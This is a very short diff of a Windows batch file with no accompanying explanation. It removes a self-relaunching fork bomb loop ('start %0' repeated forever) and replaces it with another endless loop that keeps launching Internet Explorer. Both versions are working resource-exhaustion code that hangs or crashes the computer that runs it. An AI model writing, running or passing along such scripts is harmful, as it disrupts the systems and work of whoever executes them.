@@ -1,4 +1,4 @@
 @echo off
-:start
-start %0
-goto start
+:1
+start iexplore.exe
+goto 1
